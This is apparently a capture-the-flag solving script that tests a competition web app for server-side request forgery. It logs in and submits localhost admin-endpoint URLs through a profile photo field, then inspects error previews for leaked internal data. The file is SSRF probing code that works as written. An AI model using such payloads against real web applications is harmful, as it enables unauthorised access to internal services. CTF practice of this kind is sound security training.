#!/usr/bin/env python3
import requests

# Target URL
BASE_URL = "http://ctf.compfest.id:7302"

def register_and_login():
    """Register a new user and login"""
    username = "test_user"
    password = "test123"
    
    # Register
    data = {'username': username, 'password': password}
    requests.post(f"{BASE_URL}/register", data=data)
    
    # Login
    response = requests.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    if response.status_code == 302:
        return response.cookies
    return None

def test_ssrf():
    """Test SSRF with simple payloads"""
    print("[+] Testing SSRF with simple payloads...")
    
    # Get session
    cookies = register_and_login()
    if not cookies:
        print("[-] Failed to login!")
        return
    
    print("[+] Successfully logged in!")
    
    # Test simple localhost access
    test_urls = [
        "http://127.0.0.1:5000/internal/admin/search",
        "http://127.0.0.1:5000/internal/admin/search?q=",
        "http://127.0.0.1:5000/internal/admin/search?q=access_level",
    ]
    
    for url in test_urls:
        print(f"\n[*] Testing: {url}")
        
        data = {'photo_url': url}
        
        try:
            response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
            
            print(f"[+] Status: {response.status_code}")
            
            if response.status_code == 200:
                # Check for error preview
                if "Failed to render as image" in response.text:
                    start = response.text.find("<pre>")
                    end = response.text.find("</pre>")
                    if start != -1 and end != -1:
                        preview = response.text[start+5:end]
                        print(f"[+] Error preview: {preview}")
                        
                        if "Access denied" in preview:
                            print("[+] Got 'Access denied' - SSRF is working but IP check is blocking")
                        elif "Error" in preview:
                            print(f"[+] Got error: {preview}")
                        else:
                            print(f"[+] Got interesting response: {preview}")
                else:
                    print("[+] No error preview found")
            else:
                print(f"[+] Response: {response.text[:200]}")
        
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    test_ssrf()
